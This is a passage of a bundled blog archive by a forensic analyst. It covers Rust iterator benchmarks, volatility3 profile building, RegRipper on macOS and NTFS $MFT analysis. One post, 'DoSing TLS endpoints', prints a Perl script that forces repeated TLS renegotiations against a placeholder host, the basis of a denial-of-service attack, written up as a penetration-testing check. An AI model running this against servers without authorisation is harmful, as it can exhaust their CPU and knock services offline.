"use strict";(self.webpackChunkjanstarke_blog=self.webpackChunkjanstarke_blog||[]).push([[4031],{4108:e=>{e.exports=JSON.parse('{"archive":{"blogPosts":[{"id":"/2024/06/15/rust-using-iterators","metadata":{"permalink":"/blog/2024/06/15/rust-using-iterators","source":"@site/blog/2024-06-15-rust-using-iterators.mdx","title":"Rust: Iterators are not faster; Anyway, you should use them","description":"Since some time, I\'m wondering whether using iterators in Rust has some","date":"2024-06-15T00:00:00.000Z","tags":[],"readingTime":5.695,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"layout":"post","title":"Rust: Iterators are not faster; Anyway, you should use them","date":"2024-06-15T00:00:00.000Z","categories":"rust","authors":["jasa"]},"unlisted":false,"nextItem":{"title":"Analyzing Linux memory images with volatility","permalink":"/blog/2022/04/04/centos7-volatility"}},"content":"Since some time, I\'m wondering whether using iterators in Rust has some\\nbenefits over traditional `for` loops.\\n\\n## The idea\\n\\nConsider the following loop:\\n\\n```rust\\nlet mut sum = 0;\\nfor i in 1..=100 {\\n    sum += i;\\n}\\n```\\n\\nwhich expands during execution to \\n\\n```rust\\nlet mut sum = 0;\\nsum += 1;\\nsum += 2;\\nsum += 3;\\n// ...\\n```\\n\\nThe way we expressed the sum also defines in which order the summation\\nhas to be done. But, to be honest, we are not interested in the concrete order.\\nIn fact, the single summations could be done on multiple cores simultaneously.\\n\\nAn alternative way of implementing the above algorithm using iterators could be\\n\\n```rust\\nlet sum: u32 = (1..=100).sum();\\n```\\n\\nCan this be faster? I don\'t know. So, let\'s use a more complicated example and check it out\\n\\n## The test case\\n\\nTo test which approach is faster, we need to prevent the compiler to optimize too simple things. For example, the above code using the `for` loop compiles to\\n\\n```asm\\n    xor     eax, eax\\n    mov     ecx, 100\\n    xor     edx, edx\\n.LBB45_1:\\n    mov     esi, edx\\n    lea     edx, [rsi, +, 1]\\n    cmp     esi, 100\\n    cmovae  edx, ecx\\n    add     eax, esi\\n    cmp     esi, 99\\n    ja      .LBB45_3\\n    cmp     edx, 101\\n    jb      .LBB45_1\\n.LBB45_3:\\n    ret\\n```\\n\\nwhile the iterator based approach compiles to\\n```asm\\n    mov     eax, 5050\\n    ret\\n```\\n\\nOf course, this results from the fact that the compiler knows a lot about the code to be optimized. So, again, we need a more complicated code.\\n\\nWe\'ll do the following:\\n\\n 1. iterate through the first `1_000_000` integers, stored as `String`\\n 1. convert the `String` into `u64`\\n 1. filter out numbers which are greater or equal to `100_000`\\n 1. filter out numbers which are no prime numbers\\n 1. calculate the sum of those numbers\\n\\nWe use the following implementations:\\n\\n### Loop approach\\n\\n```rust\\n#[inline(never)]\\nfn sum1<\'s>(data: impl Iterator<Item = &\'s String>) -> u64 {\\n    let mut s = 0;\\n    for i in data {\\n        if let Ok(i) = i.parse::<u64>() {\\n            if i < 100_000 {\\n                if i.is_prime() {\\n                    s += i;\\n                }\\n            }\\n        }\\n    }\\n    s\\n}\\n```\\n\\n### Iterator approach\\n\\n```rust\\n#[inline(never)]\\nfn sum2<\'s>(data: impl Iterator<Item = &\'s String>) -> u64 {\\n    data.filter_map(|s| s.parse::<u64>().ok())\\n        .filter(|i| i < &100_000)\\n        .filter(|i| i.is_prime())\\n        .sum()\\n}\\n```\\n\\n### Common code\\n\\nTo implement the `is_prime` method, I use the following simple code, which is using the [primes](https://crates.io/crates/primes) crate:\\n\\n```rust\\ntrait IsPrime {\\n    fn is_prime(&self) -> bool;\\n}\\n\\nimpl IsPrime for u64 {\\n    fn is_prime(&self) -> bool {\\n        primes::is_prime(*self)\\n    }\\n}\\n```\\n\\nIn addition, I generate a static data array `NUMBERS`:\\n\\n```rust\\nlazy_static! {\\n    static ref NUMBERS: Vec<String> = (1..1_000_000).map(|i| format!(\\"{i}\\")).collect();\\n}\\n```\\n\\n### Benchmarking code\\n\\nTo test the speed of the above code, I\'m using `cargo bench` with the following test code \\n\\n```rust\\n\\n#[cfg(test)]\\nmod tests {\\n    use super::*;\\n    use test::Bencher;\\n\\n    #[bench]\\n    fn test_sum1(b: &mut Bencher) {\\n        b.iter(|| assert_eq!(sum1(NUMBERS.iter()), 454396537))\\n    }\\n\\n    #[bench]\\n    fn test_sum2(b: &mut Bencher) {\\n        b.iter(|| assert_eq!(sum2(NUMBERS.iter()), 454396537))\\n    }\\n}\\n\\n```\\n\\n## Benchmarking results\\n\\nRunning the benchmark yields the following result:\\n\\n```\\ntest tests::test_sum1 ... bench:  25,637,873.10 ns/iter (+/- 1,921,695.73)\\ntest tests::test_sum2 ... bench:  25,639,836.30 ns/iter (+/- 1,405,975.61)\\n```\\n\\nOMG, what has happened???!!? Both approaches are equally performant. There seems to be no important difference between using a loop or iterator.\\n\\n**That\'s our first result: It doesn\'t matter whether you use traditional loops or iterators. You can expect both to be similar fast.**\\n\\n## Iterators on steroids\\n\\nLet\'s change out iterator based sum function a little bit: replacing `Iterator` by `ParallelIterator`, which is a trait from the [rayon](https://crates.io/crates/rayon) crate. *rayon* allows you to do anything in parallel what you can do with normal iterators. So, if you have some code which is based on using iterators, you can simply switch to parallel iterators.\\n\\nWe add an additional sum function:\\n\\n```rust\\n\\n#[inline(never)]\\nfn sum3<\'s>(data: impl ParallelIterator<Item = &\'s String>) -> u64 {\\n    data.filter_map(|s| s.parse::<u64>().ok())\\n        .filter(|i| i < &100_000)\\n        .filter(|i| i.is_prime())\\n        .sum()\\n}\\n```\\n\\nBe aware that the only difference to `sum2` is the trait `ParallelIterator`. No other code change is necessary.\\n\\nAlso, we need a benchmarking function:\\n\\n```rust\\n#[bench]\\nfn test_sum3(b: &mut Bencher) {\\n    b.iter(|| assert_eq!(sum3(NUMBERS.par_iter()), 454396537))\\n}\\n```\\n\\nAs you can see, there is another difference: to create a `ParallelIterator`, we use the function `par_iter()` instead of `iter()`. So, you have the full control whether you want to use parallel iterators or not.\\n\\n### Benchmarking parallel iterators\\n\\nThe benchmarking result (on a system with 4 virtual CPUs) is very informative:\\n\\n```\\ntest tests::test_sum1 ... bench:  25,621,303.60 ns/iter (+/- 1,528,567.84)\\ntest tests::test_sum2 ... bench:  25,752,965.60 ns/iter (+/- 2,927,367.52)\\ntest tests::test_sum3 ... bench:  11,761,348.20 ns/iter (+/- 2,472,399.91)\\n```\\n\\nWe can conclude:\\n - using the parallel iterator in our test case is significantly faster\\n - migrating the code from traditional iterators to parallel iterators is simple\\n\\n## Iterators as design pattern\\n\\nUsing iterators is an implementation of the [Pipes-and-Filters](https://en.wikipedia.org/wiki/Pipeline_(software)) design pattern:\\n\\n[![](/img/2024-06-15-rust-using-iterators/iterator-pipes-filter.drawio.svg)](/img/2024-06-15-rust-using-iterators/iterator-pipes-filter.drawio.svg)\\n\\nThis approach has a lot of practical benefits:\\n\\n - it is easy to\\n   - insert a *processor* into the pipeline\\n   - remove one *processor* from the pipeline\\n   - change the order of *processors* in the pipeline\\n - every single *processor* is independant of the other, which allows to distribute them over multiple cores or even machines\\n - it can be easier to read (if you\'re familiar with the concept)\\n \\n## Conclusion\\n\\nIt doesn\'t matter if you use traditional loops or iterators. There will be no significant performance impact. But, if you want to be able to do significant changes, such as distributing loop iterations over multiple CPUs, without breaking your code, use iterators.\\n\\n## One more thing\\n\\nIt is very important to implement you algorithm in the right way. But it is more important to understand the algorithm in detail, and to keep your implementation as neat to that as possible. \\n\\nFor example, let\'s change `sum1` by inserting a `break`:\\n\\n```rust\\n\\n#[inline(never)]\\nfn sum1<\'s>(data: impl Iterator<Item = &\'s String>) -> u64 {\\n    let mut s = 0;\\n    for i in data {\\n        if let Ok(i) = i.parse::<u64>() {\\n            if i >= 100_000 {\\n                break;\\n            }\\n            if i.is_prime() {\\n                s += i;\\n            }\\n        }\\n    }\\n    s\\n}\\n```\\n\\nand again benchmarking:\\n\\n```rust\\ntest tests::test_sum1 ... bench:  11,603,891.70 ns/iter (+/- 742,577.75)\\ntest tests::test_sum2 ... bench:  25,899,039.20 ns/iter (+/- 1,916,178.50)\\ntest tests::test_sum3 ... bench:  11,899,570.60 ns/iter (+/- 5,477,771.27)\\n```\\n\\nWhat has happened? Clearly, it doesn\'t make sense to iterate through `1_000_000` numbers, while we\'re only interested in the first `100_000`. Because when using a loop we know the order of the execution, we can abort as soon as we crossed the border to uninteresting numbers (those above `100_000`). In our test case, this has a similar effect to the performance such as using parallel iterators.\\n\\nSo, again: First you need to completely understand your problem, choose the best matching algorithm, and implement it correctly. Then, you can optimize."},{"id":"/2022/04/04/centos7-volatility","metadata":{"permalink":"/blog/2022/04/04/centos7-volatility","source":"@site/blog/2022-04-04-centos7-volatility.mdx","title":"Analyzing Linux memory images with volatility","description":"Why volatility3? Because version 2 is deprecated.","date":"2022-04-04T00:00:00.000Z","tags":[],"readingTime":1.92,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"layout":"post","title":"Analyzing Linux memory images with volatility","date":"2022-04-04T00:00:00.000Z","categories":"forensics tools","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"Rust: Iterators are not faster; Anyway, you should use them","permalink":"/blog/2024/06/15/rust-using-iterators"},"nextItem":{"title":"Using regripper on MacOS","permalink":"/blog/2021/11/02/Using-regripper-on-darwin"}},"content":"Why volatility3? Because version 2 is deprecated.\\n\\n```shell\\n\\n# download the current git repo\\ngit clone https://github.com/volatilityfoundation/volatility3.git\\n\\n# create local python venv\\npython3 -m venv venv\\nsource venv/bin/activate\\n\\n# install volatility\\npushd volatility3\\npip3 install -r requirements.txt\\npython3 setup.py build\\npython3 setup.py install\\npopd\\n```\\n\\nAt this point in history, you have volatility3 installed in `venv`.\\n\\n# Obtaining a matching profile\\n\\nVolatility needs to know a lot about the memory layout you\'re going to work with. Because every linux kernel can have a different layout, you need to get the special layout for your kernel. volatility calls this the *profile*.\\n\\nTo generate the profile, you need the following:\\n - the tool `dwarf2json`, which is a separate github project\\n - the kernel with debug information (*not* the debug kernel)\\n - the `System.map` file\\n\\n## Installing `dwarf2json`\\n\\nAssuming you already have the go language installed, you can do the following:\\n\\n```shell\\ngit clone https://github.com/volatilityfoundation/dwarf2json.git\\npushd dwarf2json\\ngo build\\npopd\\n```\\n\\nThis compiles a binary file named `dwarf2json` in the current directory. Copy it to whereever you want.\\n\\n## Obtaining the kernel with debug information`\\n\\nFirst, you need to know the exact kernel version. I managed to get it by `grep`ping for `Linux version` in the memory image and obtained `3.10.0-862.3.2.el7.x86_64`. For the distribution and this version, there existed a package named `kernel-debuginfo-3.10.0-862.3.2.el7.x86_64.rpm`, which I downloaded from the official repository. Now, you can extract the required file. I used `rpm2cpio` for this:\\n\\n```shell\\nmkdir tmp_kernel\\npushd tmp_kernel\\nrpm2cpio ../kernel-debuginfo-3.10.0-862.3.2.el7.x86_64.rpm |cpio -i --make-directories\\npopd\\n```\\n\\nThe resulting file in my case was `usr/lib/debug/lib/modules/3.10.0-862.3.2.el7.x86_64/vmlinux`. Let\'s keep this in mind...\\n\\n## Obtaining System.map\\n\\nThis file is part of the normal kernel package: `kernel-3.10.0-862.3.2.el7.x86_64.rpm`\\n\\n```shell\\nmkdir tmp_system_map\\npushd tmp_system_map\\nrpm2cpio ../kernel-3.10.0-862.3.2.el7.x86_64.rpm |cpio -i --make-directories\\npopd\\n```\\n\\nI found the `System.map` as `boot/System.map-3.10.0-862.3.2.el7.x86_64`\\n\\n## Generating the profile\\n\\nNow, we have all we need. Let\'s go\\n\\n```shell\\ndwarf2json/dwarf2json linux \\\\\\n        --elf tmp_kernel/usr/lib/debug/lib/modules/3.10.0-862.3.2.el7.x86_64/vmlinux \\\\\\n        --system-map tmp_system_map/boot/System.map-3.10.0-862.3.2.el7.x86_64 \\\\\\n        >centos7-3.10.0-862.3.2.el7.x86_64.json\\n\\n# cleaning up\\nrm -rf tmp_*\\n```\\n\\n# Installing the profile\\n\\nvolatility expects the profile as *xz* file, so let\'s compress it:\\n\\n```shell\\nxz centos7-3.10.0-862.3.2.el7.x86_64.json\\n```\\n\\nAssume, you have *Python v3.9* and *volatility3 v2.0.3*, then you symbols directory is `venv/lib/python3.9/site-packages/volatility3-2.0.3-py3.9.egg/volatility3/symbols/`. We will refer to it as `$SYMBOLS_DIR`:\\n\\n```shell\\nmkdir $SYMBOLS_DIR/linux\\nmv centos7-3.10.0-862.3.2.el7.x86_64.json.xz $SYMBOLS_DIR/linux\\n```\\n\\nThat\'s it. Now, you have a matching profile ready to be used."},{"id":"/2021/11/02/Using-regripper-on-darwin","metadata":{"permalink":"/blog/2021/11/02/Using-regripper-on-darwin","source":"@site/blog/2021-11-02-Using-regripper-on-darwin.mdx","title":"Using regripper on MacOS","description":"Fixing construction of the plugins path","date":"2021-11-02T00:00:00.000Z","tags":[],"readingTime":0.76,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"layout":"post","title":"Using regripper on MacOS","date":"2021-11-02T00:00:00.000Z","categories":"forensics tools","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"Analyzing Linux memory images with volatility","permalink":"/blog/2022/04/04/centos7-volatility"},"nextItem":{"title":"Forensic analysis of deleted `$MFT` entries","permalink":"/blog/2021/10/22/mft_entry_sequence"}},"content":"```shell\\ngit clone https://github.com/keydet89/RegRipper3.0.git\\n\\ncpan install Parse::Win32Registry\\n\\n# find out where Parse::Win32Registry was installed\\n\\ncp -r /usr/local/Cellar/perl/5.34.0/lib/perl5/site_perl/5.34.0/Parse .\\n\\nmv *.pm Parse/Win32Registry/WinNT/\\n```\\n\\n## Fixing construction of the `plugins` path\\n\\nOn unixoid systems, `rip.pl` ignores the folder where it is stored and looks for the `plugins` folder in the current working directory (https://github.com/keydet89/RegRipper3.0/issues/42). This can be fixed using the following patch:\\n\\n```diff\\ndiff --git a/Analysis/RegRipper3.0/rip.pl b/Analysis/RegRipper3.0/rip.pl\\nindex 8f626a7..9027209 100644\\n--- a/Analysis/RegRipper3.0/rip.pl\\n+++ b/Analysis/RegRipper3.0/rip.pl\\n@@ -67,7 +67,7 @@ $str =~ s/($path[scalar(@path) - 1])//;\\n # code updated 20190318\\n my $plugindir;\\n ($^O eq \\"MSWin32\\") ? ($plugindir = $str.\\"plugins/\\")\\n-                   : ($plugindir = File::Spec->catfile(\\"plugins\\"));\\n+                   : ($plugindir = File::Spec->catfile($str, \\"plugins\\"));\\n #my $plugindir = $str.\\"plugins/\\";\\n #my $plugindir = File::Spec->catfile(\\"plugins\\");\\n #print \\"Plugins Dir = \\".$plugindir.\\"\\\\n\\";\\n ```\\n\\n# Usage example\\n\\n```shell\\nPERL5LIB=$(pwd) perl rip.pl -r Amcache.hve -p amcache_tln >amcache.tln\\n```\\n\\n# Convert `TLN` format to `bodyfile` format\\n\\n```shell\\nawk -F \'|\' \'{OFS=\\"|\\";print 0,$5,0,0,0,0,0,-1,$1,-1,-1}\' <test.tln |TZ=UTC mactime -b - -d\\n```"},{"id":"/2021/10/22/mft_entry_sequence","metadata":{"permalink":"/blog/2021/10/22/mft_entry_sequence","source":"@site/blog/2021-10-22-mft_entry_sequence.mdx","title":"Forensic analysis of deleted `$MFT` entries","description":"In the book FILE SYSTEM FORENSIC ANALYSIS, the author Brian Carrier states that \\"Every MFT entry also has a 16-bit sequence numberthat is incremented when the entry is allocated. For example, consider MFT entry 313 with a sequence number of 1. The file that allocated entry 313 is deleted, and the entry is allocated to a new file. When the entry is reallocated, it has a new sequence number of 2.\\" (page 276).","date":"2021-10-22T00:00:00.000Z","tags":[],"readingTime":2.235,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"layout":"post","title":"Forensic analysis of deleted `$MFT` entries","date":"2021-10-22T00:00:00.000Z","categories":"forensics","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"Using regripper on MacOS","permalink":"/blog/2021/11/02/Using-regripper-on-darwin"},"nextItem":{"title":"$MFT file parser improved","permalink":"/blog/2021/10/17/mft2bodyfile2"}},"content":"In the book *FILE SYSTEM FORENSIC ANALYSIS*, the author *Brian Carrier* states that *\\"Every MFT entry also has a 16-bit sequence numberthat is incremented when the entry is allocated. For example, consider MFT entry 313 with a sequence number of 1. The file that allocated entry 313 is deleted, and the entry is allocated to a new file. When the entry is reallocated, it has a new sequence number of 2.\\"* (page 276).\\n\\nI think this i partially wrong. Let\'s see what Microsoft is saying: *\\"The sequence number. This value is incremented each time that a file record segment is freed; it is 0 if the segment is not used. The SequenceNumber field of a file reference must match the contents of this field; if they do not match, the file reference is incorrect and probably obsolete.\\"* ([https://docs.microsoft.com/en-us/windows/win32/devnotes/file-record-segment-header](https://docs.microsoft.com/en-us/windows/win32/devnotes/file-record-segment-header))\\n\\n# Why is this important?\\n\\nThis information is crucial when you found a file which has been content of some deleted folder. To retrieve the folders name, you need to find its `$FILE_NAME` information. So, you take the `parent` field from the `$FILE_NAME`attribute of the deleted file. Let\'s assume this is `313-1` (where `313` is the parent entry number and `1` is its sequence number). Further, let\'s assume that this parent has been deleted, but the MFT entry was not reallocated:\\n\\n - If the sequence number was incremented upon reallocated, it would still be `1`\\n - Otherwise, if the sequence number was incremented when deleting the folder, it would be `2` now.\\n\\n But how can we be sure that we can use the `$FILE_NAME` of `313-2`, if the deleted file refered to `313-1`?\\n\\n # Let\'s test what happens.\\n\\n## Test setup\\n\\n I created a NTFS partition using Windows 8, and created three folders:\\n\\n  - `bulk delete`\\n  - `single delete`\\n  - `mixed delete`\\n\\nEach folder had two files: `sample1.rtf` and `samples.rtf`. Than I did the following:\\n \\n  - delete `bulk delete` with all its contents\\n  - delete `mixed delete/sample2.rtf`\\n  - delete `mixed delete` with all of its contents (`sample1.rtf`)\\n  - delete `single delete/sample1.rtf`\\n  - delete `single delete/sample2.rtf`\\n  - delete `single delete` with all of its contents (none)\\n\\n## Results\\n\\nAfter deletion, I found the following MFT references\\n\\n| Name | Entry # | Parent entry # |\\n|-|-|-|\\n|`bulk delete`| `37-2` | `5-5` |\\n|`bulk delete/sample1.rtf`| `43-2` | `37-1` |\\n|`bulk delete/sample2.rtf`| `44-2` | `37-1`|\\n|`single delete`| `41-2` | |\\n|`single delete/sample1.rtf`| `47-2` | `41-1` |\\n|`single delete/sample2.rtf`| `48-2` | `41-1` |\\n|`mixed delete`| `42-2` | |\\n|`mixed delete/sample1.rtf`| `45-1` | `42-1` |\\n|`mixed delete/sample2.rtf`| `46-1` | `42-1` |\\n\\nObviously, our test shows that sequence numbers are incremented right after deletion, but *not* nessecarily at reallocation. The Microsoft documentation is right."},{"id":"/2021/10/17/mft2bodyfile2","metadata":{"permalink":"/blog/2021/10/17/mft2bodyfile2","source":"@site/blog/2021-10-17-mft2bodyfile2.mdx","title":"$MFT file parser improved","description":"I added some improvements to mft2bodyfile (https","date":"2021-10-17T00:00:00.000Z","tags":[],"readingTime":0.855,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"layout":"post","title":"$MFT file parser improved","date":"2021-10-17T00:00:00.000Z","categories":"rust forensics","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"Forensic analysis of deleted `$MFT` entries","permalink":"/blog/2021/10/22/mft_entry_sequence"},"nextItem":{"title":"$MFT file parser finalized","permalink":"/blog/2021/05/16/mft2bodyfile"}},"content":"I added some improvements to `mft2bodyfile` ([https://github.com/janstarke/mft2bodyfile](https://github.com/janstarke/mft2bodyfile)) and released version *0.5.0*. Mainly, the following things have changed:\\n\\n- I fixed the problem with nonresident attributes: `mft2bodyfile` reads all (really: _all_) MFT entries and tries to correlate them. This is possible, because there is a bidirectional relationship between the base entry and the nonbase entries. Until now, I started with the base entry and tried to find the corresponding nonbase entries, which failed if the `$ATTRIBUTE_LIST` was nonresident. Now, I don\'t try to find the nonbase entries, but instead use the base reference to find the base entry.\\n- The performance has improved a lot.\\n\\n# What\'s missing?\\n\\nOnly one thing (at the moment): Sometimes there are nonbase entries which belonged to base entries of deleted files (this can be detected to the sequence numbers of the base reference and the entry at the base position do not match). This is no problem, until we try to read `$STANDARD_INFORMATION`or `$FILENAME`, which may not be existing anymore. These entries are ignored by `mft2bodyfile`."},{"id":"/2021/05/16/mft2bodyfile","metadata":{"permalink":"/blog/2021/05/16/mft2bodyfile","source":"@site/blog/2021-05-16-mft2bodyfile.mdx","title":"$MFT file parser finalized","description":"After some days of work, I finalized version 0.3.0 of mft2bodyfile (https://github.com/janstarke/mft2bodyfile), which is aimed to be a replacement for analyze_mft.py, which is abandoned.","date":"2021-05-16T00:00:00.000Z","tags":[],"readingTime":1.875,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"layout":"post","title":"$MFT file parser finalized","date":"2021-05-16T00:00:00.000Z","categories":"rust forensics","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"$MFT file parser improved","permalink":"/blog/2021/10/17/mft2bodyfile2"},"nextItem":{"title":"DoSing TLS endpoints","permalink":"/blog/2021/03/25/DoSing-TLS-endpoints"}},"content":"After some days of work, I finalized version *0.3.0* of `mft2bodyfile` ([https://github.com/janstarke/mft2bodyfile](https://github.com/janstarke/mft2bodyfile)), which is aimed to be a replacement for `analyze_mft.py`, which is abandoned.\\n\\n# Why did i start this project?\\n\\nUntil now, me and my team used `analyze_mft.py` to extract data from the `$MFT`, when we got triage data from a customer. Unfortunately, `analyze_mft.py` has some disadvantages:\\n* python2 is required\\n* either the `$STANDARD_INFORMATION` or the `$FILE_NAME` attribute used to generate the timestamps, bot not both of them at the same time. This always required us to merge both outputs, which is a little bit messy\\n* from time to time we had problems parsing the `$MFT`\\n\\nSo, at first we started to work on `analyze_mft.py` to fix our complaints, but we soon got stuck when we discovered one additional disadvantage:\\n* If a file has its `$FILE_NAME` attribute not stored in its base entry, but in some nonbase entry which is refered by an `$ATTRIBUTE_LIST` attribute, then this file is not shown in the bodyfile.\\n\\nYou might think that \\"non-base MFT entries do not have the `$FILE_NAME` and `$STANDARD_INFORMATION` attributes in them\\", as Brian Carrier has stated in his great book. But we found that this does happen. Further investigation showed us that nearly all fast and simple tools have the same problem. So this was the last bit that led us write a tool for our own.\\n\\n# What are the advantages of this tool?\\n\\n* way more faster than `analyze_mft.py`\\n* all files are displayed, even if they don\'t have a \'$FILENAME\' (Really??? Files can have no filename? Yes, they can. See below)\\n\\n# What are the limits of this tool?\\n\\nConsider the following situation: You have a file, which has a lot of attributes. The list of attributes is so long, that it cannot be stored in an `$MFT` entry. So, the `$ATTRIBUTE_LIST` attribute is stored as a nonresident attribute, outside the `$MFT`. At the moment, `mft2bodyfile` is not able to find the corresponding `$MFT` entries, and will generate a filename.\\n\\nCan we fix this? Yes, we can. If we detect such a situation, we can search the `$MFT` entries which refer to our base entry, and use those to find a `$FILE_NAME` attribute. \\n\\n## Update: fixed in *0.5.0*"},{"id":"/2021/03/25/DoSing-TLS-endpoints","metadata":{"permalink":"/blog/2021/03/25/DoSing-TLS-endpoints","source":"@site/blog/2021-03-25-DoSing-TLS-endpoints.mdx","title":"DoSing TLS endpoints","description":"During these day, I had an interesting task: to test if som specific endpoint is vulnerable against a client-side TLS renegotiation DoS vulnerability.","date":"2021-03-25T00:00:00.000Z","tags":[],"readingTime":2.65,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"layout":"post","title":"DoSing TLS endpoints","date":"2021-03-25T00:00:00.000Z","categories":"pentest perl","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"$MFT file parser finalized","permalink":"/blog/2021/05/16/mft2bodyfile"},"nextItem":{"title":"Pairing based cryptography in Rust","permalink":"/blog/2021/02/13/Pairing_based_cryptography_in_Rust"}},"content":"During these day, I had an interesting task: to test if som specific endpoint is vulnerable against a client-side TLS renegotiation DoS vulnerability.\\n\\n# The vulnerability\\n\\nNegotiating a shared secret requires a lot of computation and thus needs some CPU time. The idea of the attack is to initiate a TLS connection and then request a renegotiation of the shared secret over and over again. This would consume a lot of CPU time from the server, which is the resource we\'re going to exhaust.\\n\\n# The test\\n\\nTo exploit the vulnerability, you must make sure that the client consume much less CPU time than the server does. So, you have to tweak the renegotiation. I didn\'t do this, becaus I wasn\'t interested in really exhausting the server resources. I was only interested in the following questions:\\n\\n* Does the server really support client-initiated renegotiation?\\n* How many renegotiations are allowed by the server before it terminates the connection?\\n\\n# What did I learn?\\n\\nMost TLS implementations have removed the client-initiated renegotiation from its source code, so If you use an up-to-date implementation, chances are good that you are not vulnerable.\\n\\n# Expoit source code\\n```perl\\nuse Socket;\\nuse Net::SSLeay qw(die_now die_if_ssl_error) ;\\nuse strict;\\nuse warnings;\\nuse Errno qw(EINTR EIO :POSIX);\\nuse IO::Socket::INET;\\n\\nNet::SSLeay::load_error_strings();\\nNet::SSLeay::SSLeay_add_ssl_algorithms();\\nNet::SSLeay::randomize();\\n\\nmy $hostname = \\"<yourhost>\\";\\nmy $port = \\"443\\";\\nmy $request = \\"HEAD / HTTP/1.1\\\\r\\\\n\\\\r\\\\n\\";\\n\\nsub error_name($) {\\n    my $id = shift;\\n    my @errors = (\\n        \'SSL_ERROR_NONE\',\\n        \'SSL_ERROR_SSL\',\\n        \'SSL_ERROR_WANT_READ\',\\n        \'SSL_ERROR_WANT_WRITE\',\\n        \'SSL_ERROR_WANT_X509_LOOKUP\',\\n        \'SSL_ERROR_SYSCALL\',\\n        \'SSL_ERROR_ZERO_RETURN\',\\n        \'SSL_ERROR_WANT_CONNECT\',\\n        \'SSL_ERROR_WANT_ACCEPT\'\\n    );\\n    die \\"invalid error number\\" unless $errors[$id];\\n    my $result;\\n    return $errors[$id];\\n}\\n\\nsub display_result($$$) {\\n    my $ssl = shift;\\n    my $result = shift;\\n    my $function = shift;\\n\\n    die_if_ssl_error(\\"ssl $function ($!)\\");\\n\\n    if (0 != (my $error_id = Net::SSLeay::get_error($ssl, $result))) {\\n        my $error = error_name($error_id);\\n        print (\\"$function() = $error\\\\n\\");\\n\\n        while (0 != (my $rv = Net::SSLeay::ERR_get_error())) {\\n            my $error_desc = Net::SSLeay::ERR_error_string($rv);\\n            print (\\"stack: $error_desc\\\\n\\");\\n        }\\n    }\\n}\\n\\nsub set_options($$) {\\n    my $ctx = shift;\\n    my $option = shift;\\n    Net::SSLeay::CTX_set_options($ctx, $option)\\n     and die_if_ssl_error(\\"ssl ctx set options ($!)\\");\\n}\\n\\nsub set_version($$) {\\n    my $ctx = shift;\\n    my $version = shift;\\n    Net::SSLeay::CTX_set_ssl_version($ctx, $version)\\n     and die_if_ssl_error(\\"ssl ctx set version ($!)\\");\\n}\\n\\nsub set_ciphers($$) {\\n    my $ctx = shift;\\n    my $ciphers = shift;\\n    Net::SSLeay::CTX_set_cipher_list($ctx, $ciphers)\\n     and die_if_ssl_error(\\"ssl ctx set ciphers suites ($!)\\");\\n}\\n\\nsub ssl_connect($$) {\\n    my $ctx = shift;\\n    my $socket = shift;\\n    my $ssl = Net::SSLeay::new($ctx) or die_now(\\"Failed to create SSL $!\\");\\n    Net::SSLeay::set_fd($ssl, $socket->fileno);\\n    my $res = Net::SSLeay::connect($ssl) and die_if_ssl_error(\\"ssl connect ($!)\\");\\n    my $error = error_name(Net::SSLeay::get_error($ssl, $res));\\n    print (\\"connect() = $error\\\\n\\");\\n    print \\"Cipher `\\" . Net::SSLeay::get_cipher($ssl) . \\"\'\\\\n\\";\\n    return $ssl;\\n}\\n\\nsub configure_context($$) {\\n    my $ctx = shift;\\n    my $ciphers = shift;\\n    set_options($ctx, &Net::SSLeay::OP_ALL);\\n    set_options($ctx, &Net::SSLeay::OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION);\\n    #set_options($ctx, &Net::SSLeay::OP_SSL_OP_LEGACY_SERVER_CONNECT);\\n    set_version($ctx, &Net::SSLeay::TLSv1_2_method);\\n    set_ciphers($ctx, $ciphers);\\n}\\nmy $socket = IO::Socket::INET->new(\\n    Type => IO::Socket::SOCK_STREAM,\\n    Proto => \'tcp\',\\n    PeerAddr => $hostname,\\n    PeerPort => $port,\\n    Blocking => 1\\n) or die (\\"unable to connect: $!\\\\n\\");\\n\\n \\nmy $ctx = Net::SSLeay::CTX_new() or die_now(\\"Failed to create SSL_CTX $!\\");\\nconfigure_context($ctx, \\"DHE:EDH:ECDHE:EECDH:RSA:DH:ECDH\\");\\nmy $ssl = ssl_connect($ctx, $socket);\\n\\nmy $ret;\\nfor (my $i=0; $i<2; $i++) {\\n    Net::SSLeay::renegotiate($ssl);\\n    die_if_ssl_error(\\"ssl renegotiate ($!)\\");\\n\\n    if (! $socket->connected()) {\\n        die(\\"network connection has died\\");\\n    }\\n\\n    $ret = Net::SSLeay::do_handshake($ssl);\\n    display_result($ssl, $ret, \\"do_handshake\\");\\n}\\n\\nNet::SSLeay::free ($ssl);               # Tear down connection\\nNet::SSLeay::CTX_free ($ctx);\\nclose $socket;\\n```"},{"id":"/2021/02/13/Pairing_based_cryptography_in_Rust","metadata":{"permalink":"/blog/2021/02/13/Pairing_based_cryptography_in_Rust","source":"@site/blog/2021-02-13-Pairing_based_cryptography_in_Rust.mdx","title":"Pairing based cryptography in 